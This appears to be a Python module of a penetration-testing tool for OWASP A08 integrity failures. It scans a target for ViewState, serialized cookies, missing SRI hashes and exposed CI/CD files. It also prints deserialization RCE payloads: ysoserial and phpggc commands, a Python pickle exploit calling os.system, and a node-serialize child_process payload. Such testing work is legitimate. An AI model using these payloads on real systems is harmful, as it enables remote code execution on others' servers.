"""
modules/integrity_failures.py
tmrswrr - A08: Software & Data Integrity Failures
Deserialization, CI/CD abuse, SRI checks, supply chain
"""
import re

from config.settings import SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    error,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def deserialization_check():
    section("INSECURE DESERIALIZATION")
    url = _target()

    print(f"""
  {NEON_CYN}Deserialization Attack Payloads by Language/Framework:{RST}

  {NEON_GRN}Java (ysoserial):{RST}
    Common gadget chains: CommonsCollections, Spring, Groovy, Jdk7u21
    java -jar ysoserial.jar CommonsCollections5 "id" | base64

    Targets: serialized Java objects (rO0AB... in base64 or \\xac\\xed in raw)
    Cookie: session=rO0ABXQ... → likely Java serialization!

  {NEON_GRN}PHP (phpggc):{RST}
    phpggc Laravel/RCE1 system id | base64
    phpggc Symfony/RCE1 phpinfo | base64

    Targets: PHP serialize() output starting with O:, a:, s:

  {NEON_GRN}Python (pickle):{RST}
    import pickle, os, base64
    class Exploit(object):
        def __reduce__(self):
            return (os.system, ("id > /tmp/pwned",))
    payload = base64.b64encode(pickle.dumps(Exploit()))

  {NEON_GRN}Node.js (node-serialize):{RST}
    {{"rce":"_$$ND_FUNC$$_function(){{require('child_process').exec('id')}}()"}}

  {NEON_GRN}Detection in HTTP traffic:{RST}
    - Cookies/params starting with: rO0AB (Java), O:8: (PHP)
    - Content-Type: application/x-java-serialized-object
    - .ser files, ViewState parameter (ASP.NET)
""")

    c = prompt("[1] Test ViewState  [2] Test cookie deserialization  [0] Back")

    if c == "1":
        endpoint = prompt("Endpoint with __VIEWSTATE parameter")
        cookies = SESSION.get("cookies", "")
        out, _, _ = run_cmd(f'curl -sk "{url}{endpoint}"', timeout=10)
        if "__VIEWSTATE" in out or "viewstate" in out.lower():
            warn("ViewState detected - check if MAC validation is disabled")
            info("Tool: ysoserial.net for .NET ViewState exploitation")
            info("Tool: Blacklist3r for ViewState MAC bypass detection")
            add_vuln("ViewState Detected", "Medium", "A08:2021",
                     "ASP.NET ViewState found - check MAC validation", url + endpoint)

    elif c == "2":
        cookies = SESSION.get("cookies", "")
        if cookies:
            import base64
            import re as re2
            cookie_b64 = re2.findall(r'[A-Za-z0-9+/=]{20,}', cookies)
            for b in cookie_b64[:5]:
                try:
                    decoded = base64.b64decode(b + "==")
                    if decoded[:2] == b'\xac\xed':
                        warn("Java serialized object detected in cookie! (starts with \\xac\\xed)")
                        add_vuln("Java Deserialization in Cookie", "Critical", "A08:2021",
                                 "Java serialized object in session cookie", url)
                    elif decoded[:2] == b'O:':
                        warn("PHP serialized object detected in cookie!")
                        add_vuln("PHP Deserialization in Cookie", "Critical", "A08:2021",
                                 "PHP serialized object in cookie", url)
                except Exception:
                    pass


def sri_check():
    section("SUBRESOURCE INTEGRITY (SRI) CHECK")
    url = _target()

    info("Checking if external scripts/styles have SRI integrity hashes...")
    out, _, _ = run_cmd(f"curl -sk {url}", timeout=15)
    if not out:
        error("Could not retrieve page")
        return

    # Find external scripts
    scripts = re.findall(r'<script[^>]+src=["\']https?://[^"\']+["\'][^>]*>', out, re.I)
    styles  = re.findall(r'<link[^>]+href=["\']https?://[^"\']+["\'][^>]*stylesheet[^>]*>', out, re.I)

    resources = scripts + styles
    if not resources:
        info("No external resources found")
        return

    info(f"Found {len(resources)} external resources:")
    print()
    for r in resources:
        has_sri = "integrity=" in r.lower()
        src_m = re.search(r'(?:src|href)=["\']([^"\']+)["\']', r, re.I)
        src = src_m.group(1) if src_m else "?"
        if has_sri:
            success(f"✓ SRI present: {src[:80]}")
        else:
            warn(f"✗ NO SRI: {src[:80]}")
            add_vuln("Missing Subresource Integrity", "Medium", "A08:2021",
                     f"External resource without SRI: {src}", url)

    print(f"""
  {NEON_CYN}Generate SRI hash:{RST}
    cat file.js | openssl dgst -sha384 -binary | openssl base64 -A
    Or use: https://www.srihash.org
""")


def cicd_exposure():
    section("CI/CD & SUPPLY CHAIN EXPOSURE")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    cicd_paths = [
        ("/.github/workflows/", "GitHub Actions workflows"),
        ("/.gitlab-ci.yml",     "GitLab CI config"),
        ("/Jenkinsfile",         "Jenkins pipeline"),
        ("/.travis.yml",         "Travis CI config"),
        ("/.circleci/config.yml","CircleCI config"),
        ("/azure-pipelines.yml", "Azure DevOps"),
        ("/Dockerfile",          "Docker build file"),
        ("/docker-compose.yml",  "Docker Compose"),
        ("/docker-compose.yaml", "Docker Compose"),
        ("/k8s/",               "Kubernetes manifests"),
        ("/kubernetes/",        "Kubernetes configs"),
        ("/helm/",              "Helm charts"),
        ("/terraform/",         "Terraform IaC"),
        ("/ansible/",           "Ansible playbooks"),
        ("/.env.ci",            "CI environment vars"),
        ("/deploy.sh",          "Deploy script"),
        ("/Makefile",           "Makefile with targets"),
    ]

    info(f"Checking {len(cicd_paths)} CI/CD paths...")
    print()
    for path, desc in cicd_paths:
        out_code, _, _ = run_cmd(
            f'curl -sk {cookie_flag} -o /dev/null -w "%{{http_code}}" {url}{path} -m 5'
        )
        code = out_code.strip()
        if code == "200":
            success(f"[{code}] {url}{path}  ← {desc}")
            add_vuln(f"CI/CD File Exposed: {path}", "High", "A08:2021",
                     f"{desc} accessible", url + path)
        elif code == "403":
            info(f"[403] {path}  (exists but forbidden)")
        else:
            print(f"  {DIM}[{code}] {path}{RST}")


def run():
    print_banner("SOFTWARE & DATA INTEGRITY FAILURES", "A08:2021 - OWASP Top 10 #8")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Insecure Deserialization (Java/PHP/Python)
  {NEON_CYN}[2]{RST} Subresource Integrity (SRI) Check
  {NEON_CYN}[3]{RST} CI/CD & Supply Chain Exposure
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            deserialization_check()
        elif c == "2":
            sri_check()
        elif c == "3":
            cicd_exposure()
        save_session()
